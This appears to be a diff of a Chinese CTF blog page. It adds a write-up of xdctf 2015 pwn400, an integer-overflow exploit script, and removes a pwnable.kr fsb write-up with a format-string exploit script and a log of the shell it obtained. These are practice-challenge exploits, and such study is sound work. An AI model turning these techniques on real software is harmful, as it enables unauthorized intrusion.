@@ -422,6 +422,132 @@
             
               
                 
+                <a class="post-title-link" href="/2016/08/17/xdctf-qual-2015-pwn400/" itemprop="url">
+                  xdctf-qual-2015-pwn400
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-08-17T00:00:00+08:00" content="2016-08-17">
+              2016-08-17
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/CTFs/" itemprop="url" rel="index">
+                    <span itemprop="name">CTFs</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/08/17/xdctf-qual-2015-pwn400/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/08/17/xdctf-qual-2015-pwn400/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="Environment">Environment</h1><blockquote>
+<p>Local<br>Libc  : libc6_2.19-0ubuntu6.6_i386</p>
+</blockquote>
+<h1 id="Conclusion">Conclusion</h1><p>代码很长，IDA f5要看好久，不过关键点就在一个无符号整数溢出的地方，如下所示。本地测试</p>
+<p><img src="/images/xdctf-qual-2015-pwn400/1.jpg" alt=""></p>
+<p><code>v13+2</code>不能过大，但是这里如果输入<code>0xffff</code>就会溢出，即可绕过判断</p>
+<h1 id="Exploit">Exploit</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">target  = (<span class="string">'0'</span>, <span class="number">8888</span>)</span><br><span class="line">io      = zio(target, print_read = <span class="keyword">False</span>, print_write = <span class="keyword">False</span>, timeout = <span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">'PK\x01\x02'</span></span><br><span class="line">payload += <span class="string">'A'</span> * <span class="number">24</span></span><br><span class="line">payload += l32(<span class="number">0xffff</span>)</span><br><span class="line">payload += <span class="string">'B'</span> * <span class="number">14</span></span><br><span class="line">payload  = payload.ljust(<span class="number">200</span>, <span class="string">'C'</span>)</span><br><span class="line">io.writeline(payload)</span><br><span class="line">io.read_until(<span class="string">'f'</span>)</span><br><span class="line">flag = <span class="string">'f'</span> + io.read_until(<span class="string">'&#125;'</span>)</span><br><span class="line">io.read_line()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
                 <a class="post-title-link" href="/2016/08/14/pwnable-rookiss-fix/" itemprop="url">
                   pwnable.kr-rookiss-fix
                 </a>
@@ -797,145 +923,11 @@
 
 
     
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/08/09/pwnable-rookiss-fsb/" itemprop="url">
-                  pwnable.kr-rookiss-fsb
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-08-09T00:00:00+08:00" content="2016-08-09">
-              2016-08-09
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/Wargames/" itemprop="url" rel="index">
-                    <span itemprop="name">Wargames</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2016/08/09/pwnable-rookiss-fsb/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/08/09/pwnable-rookiss-fsb/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="Trick">Trick</h2><ul>
-<li><del>利用fsb的<code>%_$n</code>时，如果栈上的空间不是直接可控的，可以试着在栈上寻找是否有栈地址存放在上面，如果找到了，可以利用<code>%_$n</code>写入，这样相当于在栈上实现<code>arbitrary write</code>，之后就按正常的套路即可</del></li>
-<li><code>dump binary memory text 0xffffb5b0 0xffffdcb0</code></li>
-</ul>
-<h2 id="Conclusion">Conclusion</h2><p><del>没有想出来，参考了一些网上的exp，总结了一下自己没有想到的原因：没有思考如何控制栈上的空间，只是单纯的认为可控区域只在.bss段</del></p>
-<p><del>等过段时间回来再写一次exp</del></p>
-<p>今天又重新试了一下，发现之前看的那种方法也不太合适，因为要打印太多字符，后来又想了下，可以在栈上找<strong>key</strong>的地址，然后覆盖key即可绕过，因为服务器开了<strong>aslr</strong>，所以可以用暴力的方法去找key的地址</p>
-<p>不断用<code>%2217$x</code>即可，直到打印出<code>0x8048060</code></p>
-<p>到了写入的阶段，没有想到如何一次写两个字，在网上找了一些资料后发了了可以用<code>%lln</code></p>
-<p>因此在碰撞出来之后，再用<code>%2217$lln</code>写入即可覆盖<strong>key</strong></p>
-<h2 id="Exploit">Exploit</h2><p>这个exp只能在本地运行，服务器上没有zio。pwntools的版本也是写过一个，但是因为程序没有用setbuf来取消标准IO的缓冲，所以读写一直搞不定，干脆就直接ssh到服务器上手输payload了。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">target  = <span class="string">'./fsb'</span></span><br><span class="line"></span><br><span class="line">adr_buf     = <span class="number">0x804a100</span></span><br><span class="line">adr_buf2    = <span class="number">0x804a080</span></span><br><span class="line">adr_key     = <span class="number">0x804a060</span></span><br><span class="line">adr_execve  = <span class="number">0x80486ab</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(target)</span>:</span></span><br><span class="line">    io = zio(<span class="string">'./fsb'</span>, print_read = <span class="keyword">False</span>, print_write = <span class="keyword">False</span>)</span><br><span class="line">    io.read_until(<span class="string">'(1)'</span>)</span><br><span class="line">    io.writeline(<span class="string">'%2217$x'</span>)</span><br><span class="line">    leak = <span class="number">0</span></span><br><span class="line">    <span class="keyword">try</span> :</span><br><span class="line">        io.read_line()</span><br><span class="line">        leak = int(io.read_until(<span class="string">'\n'</span>)[<span class="number">0</span>:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">except</span> :</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">print</span> hex(leak)</span><br><span class="line">    <span class="keyword">if</span> leak != <span class="number">0x804a060</span>:</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'\n[+] find address of key'</span></span><br><span class="line">        io.read_until(<span class="string">'(2)'</span>)</span><br><span class="line">        io.writeline(<span class="string">'%2217$lln'</span>)</span><br><span class="line">        io.read_until(<span class="string">'(3)'</span>)</span><br><span class="line">        io.writeline(<span class="string">'0'</span>)</span><br><span class="line">        io.read_until(<span class="string">'(4)'</span>)</span><br><span class="line">        io.writeline(<span class="string">'0'</span>)</span><br><span class="line">        io.read_until(<span class="string">'key :'</span>)</span><br><span class="line">        io.writeline(<span class="string">'0'</span>)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[+] your shell !'</span></span><br><span class="line">        io.interact()</span><br><span class="line">        io.close()</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[-] please wait'</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    exp(target)</span><br></pre></td></tr></table></figure>
-<p>log</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">icemakr:~$ ssh fsb@pwnable.kr -p2222&#10;&#10;fsb@ubuntu:~$ ls&#10;flag  fsb  fsb.c&#10;fsb@ubuntu:~$ ./fsb&#10;Give me some format strings(1)&#10;%2217$x&#10;0&#10;Give me some format strings(2)&#10;^C&#10;fsb@ubuntu:~$ ./fsb&#10;Give me some format strings(1)&#10;%2217$x&#10;Segmentation fault&#10;fsb@ubuntu:~$ ./fsb&#10;Give me some format strings(1)&#10;%2217$x&#10;0&#10;Give me some format strings(2)&#10;^C&#10;fsb@ubuntu:~$ ./fsb&#10;Give me some format strings(1)&#10;%2217$x&#10;804a060&#10;Give me some format strings(2)&#10;%2217$lln&#10;&#10;Give me some format strings(3)&#10;32&#10;32&#10;17$lln&#10;Give me some format strings(4)&#10;2&#10;2&#10;&#10;17$lln&#10;Wait a sec...&#10;key :&#10;0&#10;Congratz!&#10;$ ls&#10;flag  fsb  fsb.c&#10;$ cat flag&#10;Have you ever saw an example of utilizing [n] format character?? :(&#10;$ exit</span><br></pre></td></tr></table></figure>
-<h2 id="Reference">Reference</h2><p><a href="https://gist.github.com/ihciah/2b164e86fa9dd2f267d7" target="_blank" rel="external">https://gist.github.com/ihciah/2b164e86fa9dd2f267d7</a></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -976,7 +968,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">30</span>
+              <span class="site-state-item-count">31</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -993,7 +985,7 @@
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">34</span>
+                <span class="site-state-item-count">35</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
